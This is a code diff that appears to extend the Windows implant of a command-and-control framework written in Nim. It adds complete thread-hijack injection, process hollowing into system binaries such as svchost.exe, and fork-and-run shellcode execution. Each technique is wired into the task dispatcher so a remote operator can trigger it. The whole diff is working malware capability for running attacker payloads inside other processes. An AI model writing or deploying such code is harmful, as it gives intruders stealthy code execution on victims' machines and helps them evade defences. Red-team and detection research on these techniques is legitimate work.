@@ -213,6 +213,154 @@ when defined(windows):
         if not Thread32Next(snap, addr te).bool: break
     return "[+] APC queued to " & $queued & " thread(s) in PID " & $pid
 
+  # ── Thread hijack injection ──────────────────────────────────────────────────
+  proc doThreadHijack(pid: int; sc: seq[byte]): string =
+    let hProc = callOpenProcess(PROCESS_ALL_ACCESS, WINBOOL(0), DWORD(pid))
+    if hProc == 0: return "OpenProcess failed (err " & $GetLastError() & ")"
+    defer: discard callCloseHandle(hProc)
+    let mem = callVirtualAllocEx(hProc, nil, SIZE_T(sc.len),
+                                  MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
+    if mem == nil: return "VirtualAllocEx failed (err " & $GetLastError() & ")"
+    var wr: SIZE_T
+    discard callWriteProcessMemory(hProc, mem,
+      cast[LPCVOID](unsafeAddr sc[0]), SIZE_T(sc.len), addr wr)
+    var old: DWORD
+    discard callVirtualProtectEx(hProc, mem, SIZE_T(sc.len), PAGE_EXECUTE_READ, addr old)
+    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
+    if snap == INVALID_HANDLE_VALUE: return "Toolhelp snapshot failed"
+    defer: discard CloseHandle(snap)
+    var te: THREADENTRY32
+    te.dwSize = DWORD(sizeof(te))
+    var targetTID: DWORD = 0
+    if Thread32First(snap, addr te).bool:
+      while true:
+        if te.th32OwnerProcessID == DWORD(pid): targetTID = te.th32ThreadID; break
+        if not Thread32Next(snap, addr te).bool: break
+    if targetTID == 0: return "no thread found in PID " & $pid
+    let ht = callOpenThread(THREAD_ALL_ACCESS, WINBOOL(0), targetTID)
+    if ht == 0: return "OpenThread failed (err " & $GetLastError() & ")"
+    defer: discard callCloseHandle(ht)
+    discard callSuspendThread(ht)
+    var ctx: CONTEXT
+    ctx.ContextFlags = CONTEXT_CONTROL
+    if callGetThreadContext(ht, addr ctx) != 0:
+      ctx.Rip = cast[DWORD64](mem)
+      discard callSetThreadContext(ht, addr ctx)
+    discard callResumeThread(ht)
+    return "[+] thread " & $targetTID & " hijacked in PID " & $pid & " (" & $sc.len & " B)"
+
+  # ── Process hollow ───────────────────────────────────────────────────────────
+  proc doHollow(target: string; pebytes: seq[byte]): string =
+    if pebytes.len < 0x40: return "[error: payload too small]"
+    let peOff = int(uint32(pebytes[0x3C]) or (uint32(pebytes[0x3D]) shl 8) or
+                    (uint32(pebytes[0x3E]) shl 16) or (uint32(pebytes[0x3F]) shl 24))
+    template r16(o: int): uint16 = uint16(pebytes[o]) or (uint16(pebytes[o+1]) shl 8)
+    template r32(o: int): uint32 = uint32(pebytes[o]) or (uint32(pebytes[o+1]) shl 8) or
+      (uint32(pebytes[o+2]) shl 16) or (uint32(pebytes[o+3]) shl 24)
+    template r64(o: int): uint64 = uint64(pebytes[o]) or (uint64(pebytes[o+1]) shl 8) or
+      (uint64(pebytes[o+2]) shl 16) or (uint64(pebytes[o+3]) shl 24) or
+      (uint64(pebytes[o+4]) shl 32) or (uint64(pebytes[o+5]) shl 40) or
+      (uint64(pebytes[o+6]) shl 48) or (uint64(pebytes[o+7]) shl 56)
+    if r32(peOff) != 0x00004550'u32: return "[error: not a PE]"
+    let optOff  = peOff + 24
+    if r16(optOff) != 0x020B'u16: return "[error: not PE32+]"
+    let optSz   = int(r16(peOff + 20))
+    let nSec    = int(r16(peOff + 6))
+    let entryRVA = r32(optOff + 16)
+    let prefBase = r64(optOff + 24)
+    let imgSz   = r32(optOff + 56)
+    let hdrSz   = r32(optOff + 60)
+    var tgt = target
+    if tgt.len == 0:
+      let sys = getEnvCmd("SystemRoot", "C:\\Windows")
+      tgt = sys & "\\System32\\svchost.exe"
+      for c in [sys & "\\System32\\RuntimeBroker.exe",
+                sys & "\\System32\\dllhost.exe"]:
+        if fileExists(c): tgt = c; break
+    var si: STARTUPINFOW
+    si.cb = DWORD(sizeof(si))
+    var pi: PROCESS_INFORMATION
+    var tgtW = newWideCString(tgt)
+    if callCreateProcessW(nil, tgtW, nil, nil, WINBOOL(0), CREATE_SUSPENDED,
+                          nil, nil, addr si, addr pi) == 0:
+      return "CreateProcessW(" & tgt & ") failed (err " & $GetLastError() & ")"
+    var base = callVirtualAllocEx(pi.hProcess, cast[LPVOID](int(prefBase)),
+                                   SIZE_T(imgSz), MEM_COMMIT or MEM_RESERVE,
+                                   PAGE_EXECUTE_READWRITE)
+    if base == nil:
+      base = callVirtualAllocEx(pi.hProcess, nil, SIZE_T(imgSz),
+                                 MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+    if base == nil:
+      discard TerminateProcess(pi.hProcess, 1)
+      discard CloseHandle(pi.hThread); discard CloseHandle(pi.hProcess)
+      return "VirtualAllocEx failed"
+    var wr: SIZE_T
+    let hSz = min(int(hdrSz), pebytes.len)
+    discard callWriteProcessMemory(pi.hProcess, base,
+      cast[LPCVOID](unsafeAddr pebytes[0]), SIZE_T(hSz), addr wr)
+    let secBase = optOff + optSz
+    for i in 0 ..< nSec:
+      let o    = secBase + i * 40
+      if o + 40 > pebytes.len: break
+      let va   = int(r32(o + 12))
+      let rawSz = int(r32(o + 16))
+      let rawOff = int(r32(o + 20))
+      if rawSz == 0 or rawOff == 0: continue
+      if rawOff + rawSz > pebytes.len: continue
+      let dst = cast[LPVOID](cast[int](base) + va)
+      discard callWriteProcessMemory(pi.hProcess, dst,
+        cast[LPCVOID](unsafeAddr pebytes[rawOff]), SIZE_T(rawSz), addr wr)
+    let ep = cast[uint64](base) + uint64(entryRVA)
+    var ctx: CONTEXT
+    ctx.ContextFlags = CONTEXT_CONTROL
+    if callGetThreadContext(pi.hThread, addr ctx) != 0:
+      ctx.Rip = ep
+      discard callSetThreadContext(pi.hThread, addr ctx)
+    discard ResumeThread(pi.hThread)
+    let res = "[+] hollow: " & tgt & " PID=" & $pi.dwProcessId &
+              " entry=0x" & ep.toHex()
+    discard CloseHandle(pi.hThread); discard CloseHandle(pi.hProcess)
+    return res
+
+  # ── Fork-and-run (shellcode in sacrificial process) ──────────────────────────
+  proc doForkRun(cmd: string; sc: seq[byte]): string =
+    var proc_ = cmd
+    if proc_.len == 0:
+      let sys = getEnvCmd("SystemRoot", "C:\\Windows")
+      proc_ = sys & "\\System32\\svchost.exe"
+      for c in [sys & "\\System32\\RuntimeBroker.exe",
+                sys & "\\System32\\dllhost.exe",
+                sys & "\\System32\\WerFault.exe"]:
+        if fileExists(c): proc_ = c; break
+    var si: STARTUPINFOW
+    si.cb = DWORD(sizeof(si))
+    var pi: PROCESS_INFORMATION
+    var cmdW = newWideCString(proc_)
+    if callCreateProcessW(nil, cmdW, nil, nil, WINBOOL(0), CREATE_SUSPENDED,
+                          nil, nil, addr si, addr pi) == 0:
+      return "CreateProcessW(" & proc_ & ") failed (err " & $GetLastError() & ")"
+    let mem = callVirtualAllocEx(pi.hProcess, nil, SIZE_T(sc.len),
+                                  MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
+    if mem == nil:
+      discard TerminateProcess(pi.hProcess, 1)
+      discard CloseHandle(pi.hThread); discard CloseHandle(pi.hProcess)
+      return "VirtualAllocEx failed"
+    var wr: SIZE_T
+    discard callWriteProcessMemory(pi.hProcess, mem,
+      cast[LPCVOID](unsafeAddr sc[0]), SIZE_T(sc.len), addr wr)
+    var old: DWORD
+    discard callVirtualProtectEx(pi.hProcess, mem, SIZE_T(sc.len), PAGE_EXECUTE_READ, addr old)
+    var ctx: CONTEXT
+    ctx.ContextFlags = CONTEXT_CONTROL
+    if callGetThreadContext(pi.hThread, addr ctx) != 0:
+      ctx.Rip = cast[DWORD64](mem)
+      discard callSetThreadContext(pi.hThread, addr ctx)
+    discard ResumeThread(pi.hThread)
+    let res = "[+] fork-run: " & $sc.len & " B shellcode in " & proc_ &
+              " (PID=" & $pi.dwProcessId & ")"
+    discard CloseHandle(pi.hThread); discard CloseHandle(pi.hProcess)
+    return res
+
   # ── Privilege helper ─────────────────────────────────────────────────────────
   proc enablePriv(hToken: HANDLE; privName: string): bool =
     var luid: LUID
@@ -1322,6 +1470,37 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
       except: t.sendResult(id, "", "inject_apc: " & getCurrentExceptionMsg())
     else:
       t.sendResult(id, "", "INJECT_APC: not supported on Linux")
+
+  of "THREAD_HIJACK":
+    when defined(windows):
+      if payload.len == 0: t.sendResult(id, "", "THREAD_HIJACK: no shellcode payload"); return
+      try:
+        let pid = parseJson(args){"pid"}.getInt(0)
+        if pid == 0: t.sendResult(id, "", "THREAD_HIJACK requires {\"pid\":N}"); return
+        t.sendResult(id, doThreadHijack(pid, payload), "")
+      except: t.sendResult(id, "", "thread_hijack: " & getCurrentExceptionMsg())
+    else:
+      t.sendResult(id, "", "THREAD_HIJACK: not supported on Linux")
+
+  of "HOLLOW":
+    when defined(windows):
+      if payload.len == 0: t.sendResult(id, "", "HOLLOW: no PE payload"); return
+      try:
+        let tgt = parseJson(args){"target"}.getStr("")
+        t.sendResult(id, doHollow(tgt, payload), "")
+      except: t.sendResult(id, "", "hollow: " & getCurrentExceptionMsg())
+    else:
+      t.sendResult(id, "", "HOLLOW: not supported on Linux")
+
+  of "FORK_RUN":
+    when defined(windows):
+      if payload.len == 0: t.sendResult(id, "", "FORK_RUN: no shellcode payload"); return
+      try:
+        let cmd = parseJson(args){"cmd"}.getStr("")
+        t.sendResult(id, doForkRun(cmd, payload), "")
+      except: t.sendResult(id, "", "fork_run: " & getCurrentExceptionMsg())
+    else:
+      t.sendResult(id, "", "FORK_RUN: not supported on Linux")
 
   of "PE_EXEC", "EXEC_PE":
     when defined(windows):
